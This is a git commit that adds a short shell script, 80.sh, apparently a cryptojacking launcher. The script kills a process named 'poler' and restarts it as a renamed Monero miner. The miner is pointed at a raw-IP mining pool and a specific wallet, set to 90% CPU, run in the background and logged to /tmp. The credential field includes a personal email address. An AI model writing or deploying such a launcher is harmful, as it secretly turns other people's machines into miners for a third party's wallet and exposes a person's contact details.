2383ca39970da464ce22595dad470d1405abab69
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-06-12 06:42:47 +0300

    b2

---
+++ 80.sh
@@ -0,0 +1,3 @@
+pkill poler
+sleep 7
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 90 --cpu-priority 4 -o 94.103.94.24:5991 -u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY --pass=b2-furfurbur:robbertopp1@gmail.com -k
